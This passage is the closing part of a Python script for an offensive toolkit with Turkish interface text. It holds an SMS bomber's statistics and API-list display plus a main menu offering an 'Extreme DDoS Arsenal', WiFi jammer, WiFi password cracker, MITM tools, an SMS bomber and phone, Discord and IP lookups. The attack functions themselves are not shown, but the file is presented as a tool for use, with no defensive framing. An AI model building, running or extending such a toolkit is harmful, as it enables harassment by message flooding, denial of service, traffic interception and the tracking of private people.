        # Final istatistikleri
        elapsed = time.time() - self.sms_stats["start_time"]
        print(f"\n\n{Fore.GREEN}╔{'═'*50}╗")
        print(f"║{Fore.GREEN} SMS BOMBARDIMAN TAMAMLANDI{Style.RESET_ALL}{Fore.GREEN}                ║")
        print(f"║{Fore.WHITE} Başarılı SMS: {self.sms_stats['sent']}{' ':<30}║")
        print(f"║{Fore.WHITE} Başarısız: {self.sms_stats['failed']}{' ':<32}║")
        print(f"║{Fore.WHITE} Toplam süre: {elapsed:.1f} saniye{' ':<25}║")
        print(f"║{Fore.WHITE} Ortalama hız: {self.sms_stats['sent']/elapsed:.1f} sms/s{' ':<23}║")
        print(f"{Fore.GREEN}╚{'═'*50}╝{Style.RESET_ALL}")
    
    def show_sms_apis(self):
        """Kullanılan API'leri listele"""
        print(f"\n{Fore.CYAN}╔{'═'*60}╗")
        print(f"║{Fore.CYAN} SMS BOMBER API LİSTESİ{' ':<33}║")
        print(f"{Fore.CYAN}╠{'═'*60}╣")
        
        # Örnek bir numara ile API'leri göster
        apis = self.get_sms_apis("5551234567")
        for i, api in enumerate(apis, 1):
            print(f"║{Fore.WHITE} {i:2d}. {api['name']:<25} {api['method']:<4} ║")
            if i % 10 == 0 and i < len(apis):
                print(f"{Fore.CYAN}╠{'═'*60}╣")
        
        print(f"{Fore.CYAN}╠{'═'*60}╣")
        print(f"║{Fore.YELLOW} Toplam API sayısı: {len(apis)}{' ':<36}║")
        print(f"{Fore.CYAN}╚{'═'*60}╝{Style.RESET_ALL}")
    
    def set_sms_threads(self):
        """Thread sayısını ayarla"""
        thread_count = input(f"\n{Fore.CYAN}Thread sayısı (1-50, varsayılan 10): {Style.RESET_ALL}") or "10"
        try:
            thread_count = int(thread_count)
            if thread_count < 1:
                thread_count = 1
            elif thread_count > 50:
                thread_count = 50
            self.print_status(f"Thread sayısı {thread_count} olarak ayarlandı", Fore.GREEN)
        except:
            self.print_status("Geçersiz değer!", Fore.RED)
    
    def show_sms_stats(self):
        """SMS istatistiklerini göster"""
        if hasattr(self, 'sms_stats') and self.sms_stats["sent"] > 0:
            elapsed = time.time() - self.sms_stats["start_time"]
            print(f"\n{Fore.GREEN}╔{'═'*50}╗")
            print(f"║{Fore.GREEN} SMS İSTATİSTİKLERİ{Style.RESET_ALL}{Fore.GREEN}                        ║")
            print(f"║{Fore.WHITE} Başarılı SMS: {self.sms_stats['sent']}{' ':<30}║")
            print(f"║{Fore.WHITE} Başarısız: {self.sms_stats['failed']}{' ':<32}║")
            print(f"║{Fore.WHITE} Toplam süre: {elapsed:.1f} saniye{' ':<25}║")
            print(f"║{Fore.WHITE} Ortalama hız: {self.sms_stats['sent']/elapsed:.1f} sms/s{' ':<23}║")
            print(f"║{Fore.WHITE} API sayısı: {self.sms_stats['apis']}{' ':<34}║")
            print(f"{Fore.GREEN}╚{'═'*50}╝{Style.RESET_ALL}")
        else:
            self.print_status("Henüz SMS bombardımanı yapılmadı!", Fore.YELLOW)
    
    # ================ MAIN MENU ================
    def main_menu(self):
        while True:
            print(f"\n{Fore.WHITE}╔{'═'*55}╗")
            print(f"║{Fore.WHITE} 1. 💀 Extreme DDoS Arsenal              ║")
            print(f"║{Fore.WHITE} 2. 📡 WiFi Jammer                       ║")
            print(f"║{Fore.WHITE} 3. 🌍 IP Geolocation OSINT              ║")
            print(f"║{Fore.WHITE} 4. 📱 Telegram Phone Finder             ║")
            print(f"║{Fore.WHITE} 5. 🔓 WiFi Password Cracker             ║")
            print(f"║{Fore.WHITE} 6. 🕵️ MITM Arsenal                     ║")
            print(f"║{Fore.WHITE} 7. 💬 Discord ID OSINT                 ║")
            print(f"║{Fore.WHITE} 8. 📨 SMS Bomber                       ║")
            print(f"║{Fore.WHITE} 9. 🚪 Çıkış                            ║")
            print(f"{Fore.WHITE}╚{'═'*55}╝{Style.RESET_ALL}")
            
            choice = input(f"\n{Fore.CYAN}Seç Birini Gadaşım ♠︎ > : {Style.RESET_ALL}")
            
            if choice == "1":
                self.ddos_menu()
            elif choice == "2":
                self.wifi_jammer_menu()
            elif choice == "3":
                self.ip_geolocation()
            elif choice == "4":
                self.telegram_phone_finder()
            elif choice == "5":
                self.wifi_cracker_menu()
            elif choice == "6":
                self.mitm_menu()
            elif choice == "7":
                self.discord_osint()
            elif choice == "8":
                self.sms_bomber_menu()
            elif choice == "9":
                print(f"\n{Fore.GREEN}Yine Beklerim :)")
                sys.exit(0)
            else:
                self.print_status("Geçersiz seçim!", Fore.RED)

if __name__ == "__main__":
    print(f"{Fore.RED}[+] Diablo Buba Sunar {Style.RESET_ALL}")
    
    # Dependency check
    required = ["colorama", "requests"]
    for pkg in required:
        try:
            __import__(pkg)
        except ImportError:
            print(f"{Fore.RED}[!] {pkg} gerekli! pip3 install {pkg}{Style.RESET_ALL}")
            sys.exit(1)
    
    toolkit = DIXBLOBUBA()
    toolkit.main_menu()
